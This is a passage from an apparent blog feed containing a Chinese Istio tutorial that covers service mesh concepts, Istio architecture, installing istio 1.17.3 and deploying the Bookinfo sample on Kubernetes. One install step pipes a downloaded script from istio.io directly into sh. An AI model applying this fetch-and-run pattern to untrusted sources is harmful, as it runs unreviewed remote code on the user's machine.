31367<br>    port: 9090<br>    protocol: TCP<br>    targetPort: 9090<br>  selector:<br>    app.kubernetes.io/instance: kiali<br>    app.kubernetes.io/name: kiali<br>  sessionAffinity: None<br>  <span class="hljs-built_in">type</span>: NodePort    <span class="hljs-comment">#修改网络类型</span><br>status:<br>  loadBalancer: &#123;&#125;<br><br></code></pre></td></tr></table></figure><p>访问</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://10.0.0.233:30003/<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/18403ac5291248dfb0e0760c0d36d0df.png" alt="在这里插入图片描述"></p>]]></content>
    
    
    <categories>
      
      <category>istio</category>
      
    </categories>
    
    
    <tags>
      
      <tag>istio</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>istio入门篇（一）</title>
    <link href="/2025/04/18/istio%E5%85%A5%E9%97%A8%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <url>/2025/04/18/istio%E5%85%A5%E9%97%A8%E7%AF%87%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="一、背景"><a href="#一、背景" class="headerlink" title="一、背景"></a>一、背景</h1><p>一直以来“微服务”都是一个热门的词汇，在各种技术文章、大会上，关于微服务的讨论和主题都很多。对于基于 Dubbo、SpringCloud 技术体系的微服务架构，已经相当成熟并被大家所知晓，但伴随着互联网场景的复杂度提升、业务快速变更以及快速响应，如何快速、稳定、高效的应对变幻莫测的业务市场需求，这类技术体系（如：Spring Cloud）的传统微服务架构就变得力不从心，此时微服务架构再次升级，将服务网格作为了新一代微服务架构。</p><p>微服务，也称之为微服务架构，是一种架构风格，相比单体应用，它将应用程序拆分为一组服务，并将这些服务组合起来来完成整个复杂的业务功能。下面这些特征就能高度反映出它的价值所在：</p><ul><li>高度可维护和可测试性</li><li>松耦合</li><li>独立部署</li><li>围绕业务能力进行组织</li><li>小团队拥有</li></ul><p>简单的回顾完微服务架构的概念，我们一起看看新一代微服务架构是如何诞生的。</p><h3 id="基于-Spring-Cloud-的微服务体系"><a href="#基于-Spring-Cloud-的微服务体系" class="headerlink" title="基于 Spring Cloud 的微服务体系"></a><strong>基于 Spring Cloud 的微服务体系</strong></h3><p>下面这张图是基于 Spring Cloud 技术体系的微服务架构图：</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/e9f83fc160d0108ca77cf6b909ec84e1.png" alt="img"></p><ul><li>实现：所有微服务都需要将自身注册到注册中心（如：Consul、Eureka 等），来完成服务间的相互调用。每个微服务都必须依赖 Spring Cloud 组件（即：在 pom.xml 中引入），业务逻辑和 Spring Cloud 组件共生在同一个服务中。</li></ul><p>还记得 Spring Cloud 相关组件版本<strong>升级</strong>时的烦恼么？为了使用新版本中的某个特性，或者解决旧版本中存在的漏洞,Spring Cloud 版本升级屡见不鲜，一不留神就会出现版本依赖冲突、启动不了等等问题，升级完还得安排测试人员测试验证。技术含量不高，但确实招人烦啊。</p><p>再完美的程序，也避免不了零 bug。上线之后，随着系统使用场景的多样性，将逐步会暴露出一些问题，而出现问题就得解决问题，并<strong>小心翼翼</strong>安排上线，这一系列过程，想必各位肯定深有感触，各有故事。用“小心翼翼”来形容这一过程决不夸张，因为一个小小的改动可能会影响到其它，甚至整个系统，这锅谁都不太想背，<strong>能不改打死都不改的原则一直是不愿被打破的壁垒</strong>。</p><p>在传统行业（如：银行），由于系统的多样性、庞大、复杂性，全部加入微服务行列是不现实的，<strong>新老系统共存</strong>是一种最为常见的现象。而共存系统间的治理、运维等成了老大难问题</p><h3 id="传统微服务架构面临的挑战"><a href="#传统微服务架构面临的挑战" class="headerlink" title="传统微服务架构面临的挑战"></a><strong>传统微服务架构面临的挑战</strong></h3><p>面对上述暴露出的问题，并在传统微服务架构下，经过实践的不断冲击，面临了更多新的挑战，综上所述，产生这些问题的原因有以下这几点：</p><ul><li>过于绑定特定技术栈 当面对异构系统时，需要花费大量精力来进行代码的改造，不同异构系统可能面临不同的改造。</li><li>代码侵入度过高 开发者往往需要花费大量的精力来考虑如何与框架或 SDK 结合，并在业务中更好的深度融合，对于大部分开发者而言都是一个高曲线的学习过程。</li><li>多语言支持受限 微服务提倡不同组件可以使用最适合它的语言开发，但是传统微服务框架，如 Spring Cloud 则是 Java 的天下，多语言的支持难度很大。这也就导致在面对异构系统对接时的无奈，或选择退而求其次的方案了。</li><li>老旧系统维护难 面对老旧系统，很难做到统一维护、治理、监控等，在过度时期往往需要多个团队分而管之，维护难度加大。</li></ul><p>上述这些问题都是在所难免，我们都知道技术演进来源于实践中不断的摸索，将功能抽象、解耦、封装、服务化。 随着传统微服务架构暴露出的这些问题，将迎来新的挑战，让大家纷纷寻找其他解决方案。</p><p><strong>Spring Cloud 微服务架构和 Service Mesh 微服务架构</strong></p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/fd8be54cbe7b3b978bdcbfccc40b11f9.png" alt="img"></p><p><strong>为了解决微服务框架的侵入性问题，我们引入服务网格。</strong></p><p>官方文档： <a href="https://istio.io/v1.17/zh/docs/ops/deployment/architecture/">Istioldie 1.17 &#x2F; 架构</a></p><p>参考地址：<a href="https://cloud.tencent.com/developer/article/1876488">全方位解读服务网格（Service Mesh）的背景和概念-腾讯云开发者社区-腾讯云</a></p><h3 id="迎来新一代微服务架构"><a href="#迎来新一代微服务架构" class="headerlink" title="迎来新一代微服务架构"></a>迎来新一代微服务架构</h3><p>为了解决传统微服务面临的问题，以应对全新的挑战，微服务架构也进一步演化，最终催生了服务网格（Service Mesh）的出现，迎来了新一代微服务架构，也被称为下一代微服务。为了更好地理解 Service Mesh 的概念和存在的意义，让我们我们来回顾一下这一演进过程中的四个阶段。</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/2ec1597668423d592221ec635ff82f20.png" alt="img"></p><ul><li>耦合阶段：高度耦合、重复实现、维护困难，在耦合架构设计中体现的最为突出，单体架构就是典型的代表。</li><li>公共 SDK：让基础设施功能设计成为公共 SDK，提高利用率，是解藕最有效的途径，比如 Spring Cloud 就是类似的方式。但学习成本高、特定语言实现，却将一部分人拦在了门外。</li><li>Sidecar 模式：再次深度解藕，不单单功能解藕，更从跨语言、更新发布和运维等方面入手，实现对业务服务的零侵入，更解藕于开发语言和单一技术栈，实现了完全隔离，为部署、升级带来了便利，做到了真正的基础设施层与业务逻辑层的彻底解耦。另一方面，Sidecar 可以更加快速地为应用服务提供更灵活的扩展，而不需要应用服务的大量改造。</li><li>Service Mesh：把 Sidecar 模式充分应用到一个庞大的微服务架构系统中来，为每个应用服务配套部署一个 Sidecar 代理，完成服务间复杂的通信，最终就会得到一个的网络拓扑结构，这就是 Service Mesh，又称之为“服务网格“。它从本质上解决了传统微服务所面临的问题。</li></ul><h1 id="二、服务网格介绍"><a href="#二、服务网格介绍" class="headerlink" title="二、服务网格介绍"></a>二、服务网格介绍</h1><h3 id="什么是服务网格"><a href="#什么是服务网格" class="headerlink" title="什么是服务网格"></a>什么是服务网格</h3><p>在过去的几十年中，我们已经看到了单体应用程序开始拆分为较小的应用程序。此外，诸如Docker之类的容器化技术和诸如Kubernetes之类的编排系统加速了这一变化。</p><p>尽管在像Kubernetes这样的分布式系统上采用微服务架构有许多优势，但它也具有相当的复杂性。由于分布式服务必须相互通信，因此我们必须考虑发现，路由，重试和故障转移。</p><p>还有其他一些问题，例如安全性和可观察性，我们还必须注意以下问题：</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/371bc18dbb634a97b40663899fb063d2.png" alt="img"></p><p>现在，在每个服务中建立这些通信功能可能非常繁琐，尤其是当服务范围扩大且通信变得复杂时，更是如此。这正是服务网格可以为我们提供帮助的地方。基本上，服务网格消除了在分布式软件系统中管理所有服务到服务通信的责任。</p><p>服务网格能够通过一组网络代理来做到这一点。本质上，服务之间的请求是通过与服务一起运行但位于基础结构层之外的代理路由的：</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/f61dc77d33834fae95aa37afe2135804.png" alt="img"></p><p>这些代理基本上为服务创建了一个网状网络——因此得名为服务网格！通过这些代理，服务网格能够控制服务到服务通信的各个方面。这样，我们可以使用它来解决分布式计算的八个谬误，这是一组断言，描述了我们经常对分布式应用程序做出的错误假设。</p><h3 id="服务网格的特征"><a href="#服务网格的特征" class="headerlink" title="服务网格的特征"></a>服务网格的特征</h3><p>现在，让我们了解服务网格可以为我们提供的一些功能。请注意，实际功能列表取决于服务网格的实现。但是，总的来说，我们应该在所有实现中都期望其中大多数功能。</p><p>我们可以将这些功能大致分为三类：流量管理，安全性和可观察性。</p><p><strong>流量管理</strong></p><p>服务网格的基本特征之一是流量管理。这包括动态服务发现和路由。尤其影子流量和流量拆分功能，这些对于实现金丝雀发布和A&#x2F;B测试非常有用。</p><p>由于所有服务之间的通信都是由服务网格处理的，因此它还启用了一些可靠性功能。例如，服务网格可以提供重试，超时，速率限制和断路器。这些现成的故障恢复功能使通信更加可靠。</p><p><strong>安全性</strong></p><p>服务网格通常还处理服务到服务通信的安全性方面。这包括通过双向TLS（mTLS）强制进行流量加密，通过证书验证提供身份验证以及通过访问策略确保授权。</p><p>服务网格中还可能存在一些有趣的安全用例。例如，我们可以实现网络分段，从而允许某些服务进行通信而禁止其他服务。而且，服务网格可以为审核需求提供精确的历史信息。</p><p><strong>可观察性</strong></p><p>强大的可观察性是处理分布式系统复杂性的基本要求。由于服务网格可以处理所有通信，因此正确放置了它可以提供可观察性的功能。例如，它可以提供有关分布式追踪的信息。</p><p>服务网格可以生成许多指标，例如延迟，流量，错误和饱和度。此外，服务网格还可以生成访问日志，为每个请求提供完整记录。这些对于理解单个服务以及整个系统的行为非常有用。</p><h1 id="三、istio的介绍"><a href="#三、istio的介绍" class="headerlink" title="三、istio的介绍"></a>三、istio的介绍</h1><p>Istio是最初由IBM，Google和Lyft开发的服务网格的开源实现。它可以透明地分层到分布式应用程序上，并提供服务网格的所有优点，例如流量管理，安全性和可观察性。</p><p>它旨在与各种部署配合使用，例如本地部署，云托管，Kubernetes容器以及虚拟机上运行的服务程序。尽管Istio与平台无关，但它经常与Kubernetes平台上部署的微服务一起使用。</p><p>从根本上讲，Istio的工作原理是以Sidcar的形式将Envoy的扩展版本作为代理布署到每个微服务中：</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/a2669e2386564760962281efd71f9ba3.png" alt="img"></p><p>该代理网络构成了Istio架构的数据平面。这些代理的配置和管理是从控制平面完成的：</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/ef015ccc0b1c4a848d48aeb274d13425.png" alt="img"></p><p>控制平面基本上是服务网格的大脑。它为数据平面中的Envoy代理提供发现，配置和证书管理。</p><p>当然，只有在拥有大量相互通信的微服务时，我们才能体现Istio的优势。在这里，sidecar代理在专用的基础架构层中形成一个复杂的服务网格：</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/92b68553257d4277bfa2d044ae874055.png" alt="img"></p><p>Istio在与外部库和平台集成方面非常灵活。例如，我们可以将Istio与外部日志记录平台，遥测或策略系统集成。</p><h1 id="四、Istio组件"><a href="#四、Istio组件" class="headerlink" title="四、Istio组件"></a>四、Istio组件</h1><p>我们已经看到，Istio体系结构由数据平面和控制平面组成。此外，还有几个使Istio起作用的核心组件。</p><p>在本节中，我们将详细介绍这些核心组件。</p><p><strong>Envoy</strong>：一个高性能的代理，负责处理服务之间的通信。<br> <strong>Pilot</strong>：负责配置Envoy代理，提供服务发现、负载均衡、路由规则等功能。<br> <strong>Citadel</strong>：负责证书管理和身份认证。<br> <strong>Galley</strong>：负责配置管理，验证和分发Istio的配置。</p><p><strong>数据平面</strong>：由Envoy代理组成，负责处理服务之间的通信。<br> <strong>控制平面</strong>：由Pilot、Citadel和Galley组成，负责配置和管理数据平面。</p><h3 id="数据平面"><a href="#数据平面" class="headerlink" title="数据平面"></a><strong>数据平面</strong></h3><p>Envoy代理以Sidecar的形式部署在每个服务实例旁边，拦截所有的入站和出站流量。Envoy代理负责执行流量管理、安全性和可观测性等功能。</p><p>Istio的数据平面主要包括Envoy代理的扩展版本。Envoy是一个开源边缘和服务代理，可帮助将网络问题与底层应用程序分离开来。应用程序仅向localhost发送消息或从localhost接收消息，而无需了解网络拓扑。</p><p>Envoy的核心是在OSI模型的L3和L4层运行的网络代理。它通过使用可插入网络过滤器链来执行连接处理。此外，Envoy支持用于基于HTTP的流量的附加L7层过滤器。而且，Envoy对HTTP&#x2F;2和gRPC传输具有一流的支持。</p><p>Istio作为服务网格提供的许多功能实际上是由Envoy代理的基础内置功能启用的：</p><ul><li>流量控制：Envoy通过HTTP，gRPC，WebSocket和TCP流量的丰富路由规则启用细粒度的流量控制应用</li><li>网络弹性：Envoy包括对自动重试，断路和故障注入的开箱即用支持</li><li>安全性：Envoy还可以实施安全策略，并对基础服务之间的通信应用访问控制和速率限制</li></ul><p>Envoy在Istio上表现出色的另一个原因之一是它的可扩展性。Envoy提供了基于WebAssembly的可插拔扩展模型。这在定制策略执行和遥测生成中非常有用。此外，我们还可以使用基于Proxy-Wasm沙箱API的Istio扩展在Istio中扩展Envoy代理。</p><h3 id="控制面"><a href="#控制面" class="headerlink" title="控制面"></a><strong>控制面</strong></h3><p>控制平面负责配置和管理数据平面。Pilot负责将路由规则、服务发现等信息分发给Envoy代理；Citadel负责证书管理和身份认证；Galley负责验证和分发Istio的配置。</p><p>如上所述，控制平面负责管理和配置数据平面中的Envoy代理。在Istio架构中，控制面核心组件是istiod，Istiod负责将高级路由规则和流量控制行为转换为特定于Envoy的配置，并在运行时将其传播到Sidercar。</p><p>如果我们回顾一下Istio控制平面的架构，将会注意到它曾经是一组相互协作的独立组件。它包括诸如用于服务发现的Pilot，用于配置的Galley，用于证书生成的Citadel以及用于可扩展性的Mixer之类的组件。由于复杂性，这些单独的组件被合并为一个称为istiod的单个组件。</p><p>从根本上来说，istiod仍使用与先前各个组件相同的代码和API。例如，Pilot负责抽象特定于平台的服务发现机制，并将其合成为Sidecar可以使用的标准格式。因此，Istio可以支持针对多个环境（例如Kubernetes或虚拟机）的发现。</p><p>此外，istiod还提供安全性，通过内置的身份和凭据管理实现强大的服务到服务和最终用户身份验证。此外，借助istiod，我们可以基于服务身份来实施安全策略。该过程也充当证书颁发机构（CA）并生成证书，以促进数据平面中的相互TLS（MTLS）通信。</p><h1 id="五、Istio工作原理"><a href="#五、Istio工作原理" class="headerlink" title="五、Istio工作原理"></a>五、Istio工作原理</h1><p>我们已经了解了服务网格的典型特征是什么。此外，我们介绍了Istio架构及其核心组件的基础。现在，是时候了解Istio如何通过其架构中的核心组件提供这些功能了。</p><p>我们将专注于我们之前经历过的相同类别的功能。</p><h3 id="流量管理"><a href="#流量管理" class="headerlink" title="流量管理"></a><strong>流量管理</strong></h3><p>我们可以使用Istio流量管理API对服务网格中的流量进行精细控制。我们可以使用这些API将自己的流量配置添加到Istio。此外，我们可以使用Kubernetes自定义资源定义（CRD）定义API资源。帮助我们控制流量路由的关键API资源是虚拟服务和目标规则：</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/371856c6dfa141aa89adaf610801b2ff.png" alt="img"></p><p>基本上，虚拟服务使我们可以配置如何将请求路由到Istio服务网格中的服务。因此，虚拟服务由一个或多个按顺序评估的路由规则组成。评估虚拟服务的路由规则后，将应用目标规则。目标规则有助于我们控制到达目标的流量，例如，按版本对服务实例进行分组。</p><h3 id="安全性"><a href="#安全性" class="headerlink" title="安全性"></a>安全性</h3><p>Istio为每个服务提供身份。与每个Envoy代理一起运行的Istio代理与istiod一起使用以自动进行密钥和证书轮换</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/12d9f2f12a3f4da69cf295282012cd23.png" alt="img"></p><p>Istio提供两种身份验证——对等身份验证和请求身份验证。对等身份验证用于服务到服务的身份验证，其中Istio提供双向TLS作为全栈解决方案。请求身份验证用于最终用户身份验证，其中Istio使用自定义身份验证提供程序或OpenID Connect（OIDC）提供程序提供JSON Web令牌（JWT）验证。</p><p>Istio还允许我们通过简单地将授权策略应用于服务来实施对服务的访问控制。授权策略对Envoy代理中的入站流量实施访问控制。这样，我们就可以在各种级别上应用访问控制：网格，命名空间和服务范围。</p><h3 id="可观察性"><a href="#可观察性" class="headerlink" title="可观察性"></a>可观察性</h3><p>Istio为网格网络内的所有服务通信生成详细的遥测，例如度量，分布式跟踪和访问日志。Istio生成一组丰富的代理级指标，面向服务的指标和控制平面指标。</p><p>之前，Istio遥测体系结构将Mixer作为核心组件。但是从Telemetry v2开始，混音器提供的功能已替换为Envoy代理插件</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/1287d0c535144f6fb36db31ed55fa673.png" alt="img"></p><p>此外，Istio通过Envoy代理生成分布式跟踪。Istio支持许多跟踪后端，例如Zipkin，Jaeger，Lightstep和Datadog。我们还可以控制跟踪速率的采样率。此外，Istio还以一组可配置的格式生成服务流量的访问日志。</p><h1 id="六、安装istio"><a href="#六、安装istio" class="headerlink" title="六、安装istio"></a>六、安装istio</h1><p>k8s和istio版本对应表</p><p><a href="https://istio.io/latest/docs/releases/supported-releases/#support-status-of-istio-releases">Istio &#x2F; Supported Releases</a></p><p>查看k8s版本</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">[root@master231 ~]# kubectl <span class="hljs-keyword">version</span> <span class="hljs-comment">--short</span><br>Client <span class="hljs-keyword">Version</span>: v1<span class="hljs-number">.23</span><span class="hljs-number">.17</span><br><span class="hljs-keyword">Server</span> <span class="hljs-keyword">Version</span>: v1<span class="hljs-number">.23</span><span class="hljs-number">.17</span><br></code></pre></td></tr></table></figure><p>下载istio</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">下载最新版本：curl <span class="hljs-punctuation">-</span>L https<span class="hljs-punctuation">:</span><span class="hljs-comment">//istio.io/downloadIstio | sh -</span><br>下载指定版本：curl <span class="hljs-punctuation">-</span>L https<span class="hljs-punctuation">:</span><span class="hljs-comment">//istio.io/downloadIstio | ISTIO_VERSION=1.17.3 TARGET_ARCH=x86_64 sh -</span><br></code></pre></td></tr></table></figure><p>配置环境变量</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs crystal">[root<span class="hljs-variable">@master231</span> ~]<span class="hljs-comment"># cd istio-1.17.3/bin</span><br><br>[root<span class="hljs-variable">@master231</span> ~]<span class="hljs-comment"># vim .bashrc </span><br>...<br>export PATH=<span class="hljs-regexp">/root/istio</span>-<span class="hljs-number">1.17</span>.<span class="hljs-number">3</span>/<span class="hljs-symbol">bin:</span><span class="hljs-variable">$PATH</span><br><br>[root<span class="hljs-variable">@master231</span> ~]<span class="hljs-comment"># source .bashrc</span><br></code></pre></td></tr></table></figure><p>查看安装模式</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql">[root<span class="hljs-variable">@master231</span> <span class="hljs-operator">~</span>]# istioctl profile list<br>Istio configuration profiles:<br>    ambient<br>    <span class="hljs-keyword">default</span><br>    demo<br>    <span class="hljs-keyword">empty</span><br>    <span class="hljs-keyword">external</span><br>    minimal<br>    openshift<br>    preview<br>    remote<br></code></pre></td></tr></table></figure><p>在安装 Istio 时所能够使用的内置配置文件。这些配置文件提供了对 Istio 控制平面和 Istio 数据平面 Sidecar 的定制内容。</p><ul><li>default: 根据 IstioOperator API 的默认设置启动组件。 建议用于生产部署和 Multicluster Mesh 中的 Primary Cluster。 您可以运行 istioctl profile dump 命令来查看默认设置。</li><li>demo： 这一配置具有适度的资源需求，旨在展示 Istio 的功能。 它适合运行 Bookinfo 应用程序和相关任务。 这是通过快速开始指导安装的配置。 此配置文件启用了高级别的追踪和访问日志，因此不适合进行性能测试。</li><li>minimal： 与默认配置文件相同，但只安装了控制平面组件。 它允许您使用 Separate Profile 配置控制平面和数据平面组件(例如 Gateway)。</li><li>remote： 配置 Multicluster Mesh 的 Remote Cluster。</li><li>empty： 不部署任何东西。可以作为自定义配置的基本配置文件。</li><li>preview： 预览文件包含的功能都是实验性。这是为了探索 Istio 的新功能。不确保稳定性、安全性和性能（使用风险需自负）。</li></ul><p><strong>标注 ✔ 的组件安装在每个配置文件中：</strong></p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/655d95fc8f19495e930095d69ef6f733.png" alt="img"></p><p>安装istio</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">[root@master231 ~]# istioctl install --<span class="hljs-built_in">set</span> <span class="hljs-attribute">profile</span>=demo -y<br></code></pre></td></tr></table></figure><p>查看配置</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">[root@master231 ~]<span class="hljs-comment"># istioctl profile dump demo|default|minimal|...</span><br></code></pre></td></tr></table></figure><p>添加自动补全</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master231 tools]# <span class="hljs-built_in">source</span> /root/istio-1.17.3/tools/istioctl.bash<br></code></pre></td></tr></table></figure><p>创建命名空间，让所有pod注入边车形式</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-string">[root@master231 ~]</span># kubectl create ns fox<br><span class="hljs-keyword">namespace</span>/<span class="hljs-symbol">fox</span> <span class="hljs-symbol">created</span><br></code></pre></td></tr></table></figure><p>指示 Istio 在部署应用的时候，在指]定名称空间下。为fox命名空间打上标签 <code>istio-injection=enabled</code>。自动注入 Envoy 边车代理</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">[root@master231 ~]<span class="hljs-comment"># kubectl label namespace fox istio-injection=enabled</span><br>namespace/fox labeled<br></code></pre></td></tr></table></figure><h1 id="七、案例部署"><a href="#七、案例部署" class="headerlink" title="七、案例部署"></a>七、案例部署</h1><p>如果使用上面步骤安装的istio，那么就已经安装了Bookinfo这个应用。该应用由四个单独的微服务构成。</p><p>这个应用模仿在线书店的一个分类，显示一本书的信息。 页面上会显示一本书的描述，书籍的细节（ISBN、页数等），以及关于这本书的一些评论。</p><p>Bookinfo 应用分为四个单独的微服务：</p><ul><li><code>productpage</code>. 这个微服务会调用 <code>details</code> 和 <code>reviews</code> 两个微服务，用来生成页面。</li><li><code>details</code>. 这个微服务中包含了书籍的信息。</li><li><code>reviews</code>. 这个微服务中包含了书籍相关的评论。它还会调用 <code>ratings</code> 微服务。</li><li><code>ratings</code>. 这个微服务中包含了由书籍评价组成的评级信息。</li></ul><p><code>reviews</code> 微服务有 3 个版本：</p><ul><li>v1 版本不会调用 <code>ratings</code> 服务。</li><li>v2 版本会调用 <code>ratings</code> 服务，并使用 1 到 5 个黑色星形图标来显示评分信息。</li><li>v3 版本会调用 <code>ratings</code> 服务，并使用 1 到 5 个红色星形图标来显示评分信息</li></ul><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/14acff20f6724e8cad8da5917381dc04.png" alt="img"></p><p>要在 Istio 中运行这一应用，无需对应用自身做出任何改变。 您只要简单的在 Istio 环境中对服务进行配置和运行，具体一点说就是把 Envoy sidecar 注入到每个服务之中。 最终的部署结果将如下图所示</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/b0b52de1c84d4fcda25d4d674289a4a8.png" alt="img"></p><p>所有的微服务都和 Envoy sidecar 集成在一起，被集成服务所有的出入流量都被 sidecar 所劫持，这样就为外部控制准备了所需的 Hook，然后就可以利用 Istio 控制平面为应用提供服务路由、遥测数据收集以及策略实施等功能。</p><h3 id="启动应用服务"><a href="#启动应用服务" class="headerlink" title="启动应用服务"></a>启动应用服务</h3><p>使用手动注入Sidecar</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">[root@master231 ~]# kubectl apply -f &lt;(istioctl kube-<span class="hljs-keyword">inject</span> -f <span class="hljs-regexp">/root/i</span>stio-<span class="hljs-number">1.17</span>.<span class="hljs-number">3</span><span class="hljs-regexp">/samples/</span>bookinfo<span class="hljs-regexp">/platform/</span>kube/bookinfo.yaml)<br></code></pre></td></tr></table></figure><p>查看pod状态</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql">[root<span class="hljs-variable">@master231</span> <span class="hljs-operator">~</span>]# kubectl <span class="hljs-keyword">get</span> pod<br>NAME                              READY   STATUS    RESTARTS   AGE<br>details<span class="hljs-operator">-</span>v1<span class="hljs-number">-754</span>db4b55f<span class="hljs-operator">-</span>vcbhq       <span class="hljs-number">2</span><span class="hljs-operator">/</span><span class="hljs-number">2</span>     <span class="hljs-keyword">Running</span>   <span class="hljs-number">0</span>          <span class="hljs-number">19</span>m<br>productpage<span class="hljs-operator">-</span>v1<span class="hljs-number">-64</span>c6fcc6f6<span class="hljs-operator">-</span>b6552   <span class="hljs-number">2</span><span class="hljs-operator">/</span><span class="hljs-number">2</span>     <span class="hljs-keyword">Running</span>   <span class="hljs-number">0</span>          <span class="hljs-number">19</span>m<br>ratings<span class="hljs-operator">-</span>v1<span class="hljs-number">-5</span>d4d5694ff<span class="hljs-operator">-</span>g7x5s       <span class="hljs-number">2</span><span class="hljs-operator">/</span><span class="hljs-number">2</span>     <span class="hljs-keyword">Running</span>   <span class="hljs-number">0</span>          <span class="hljs-number">19</span>m<br>reviews<span class="hljs-operator">-</span>v1<span class="hljs-number">-6878588</span>b96<span class="hljs-operator">-</span>p6jht       <span class="hljs-number">2</span><span class="hljs-operator">/</span><span class="hljs-number">2</span>     <span class="hljs-keyword">Running</span>   <span class="hljs-number">0</span>          <span class="hljs-number">19</span>m<br>reviews<span class="hljs-operator">-</span>v2<span class="hljs-number">-6</span>dfc59845c<span class="hljs-operator">-</span>hx4t8       <span class="hljs-number">2</span><span class="hljs-operator">/</span><span class="hljs-number">2</span>     <span class="hljs-keyword">Running</span>   <span class="hljs-number">0</span>          <span class="hljs-number">19</span>m<br>reviews<span class="hljs-operator">-</span>v3<span class="hljs-number">-5</span>b5f87dd46<span class="hljs-operator">-</span>bq566       <span class="hljs-number">2</span><span class="hljs-operator">/</span><span class="hljs-number">2</span>     <span class="hljs-keyword">Running</span>   <span class="hljs-number">0</span>          <span class="hljs-number">19</span>m<br></code></pre></td></tr></table></figure><p>查看svc状态 </p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nix">[root@master231 ~]<span class="hljs-comment"># kubectl get svc</span><br>NAME          TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)    AGE<br>details       ClusterIP   <span class="hljs-number">10.200</span>.<span class="hljs-number">90.164</span>   <span class="hljs-symbol">&lt;none&gt;</span>        <span class="hljs-number">9080</span><span class="hljs-symbol">/TCP</span>   <span class="hljs-number">19</span>m<br>kubernetes    ClusterIP   <span class="hljs-number">10.200</span>.<span class="hljs-number">0.1</span>      <span class="hljs-symbol">&lt;none&gt;</span>        <span class="hljs-number">443</span><span class="hljs-symbol">/TCP</span>    <span class="hljs-number">28</span>d<br>productpage   ClusterIP   <span class="hljs-number">10.200</span>.<span class="hljs-number">84.58</span>    <span class="hljs-symbol">&lt;none&gt;</span>        <span class="hljs-number">9080</span><span class="hljs-symbol">/TCP</span>   <span class="hljs-number">19</span>m<br>ratings       ClusterIP   <span class="hljs-number">10.200</span>.<span class="hljs-number">90.62</span>    <span class="hljs-symbol">&lt;none&gt;</span>        <span class="hljs-number">9080</span><span class="hljs-symbol">/TCP</span>   <span class="hljs-number">19</span>m<br>reviews       ClusterIP   <span class="hljs-number">10.200</span>.<span class="hljs-number">201.22</span>   <span class="hljs-symbol">&lt;none&gt;</span>        <span class="hljs-number">9080</span><span class="hljs-symbol">/TCP</span>   <span class="hljs-number">19</span>m<br></code></pre></td></tr></table></figure><p>确认 Bookinfo 应用是否正在运行，请在某个 Pod 中用 curl 命令对应用发送请求，例如 ratings：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">kubectl exec -it $(kubectl <span class="hljs-built_in">get</span> pod -l <span class="hljs-attribute">app</span>=ratings -o <span class="hljs-attribute">jsonpath</span>=<span class="hljs-string">&#x27;&#123;.items[0].metadata.name&#125;&#x27;</span>) -c ratings -- curl productpage:9080/productpage | grep -o <span class="hljs-string">&quot;&lt;title&gt;.*&lt;/title&gt;&quot;</span><br></code></pre></td></tr></table></figure><p>出现这个说明bookinfo应用没问题</p><p><img 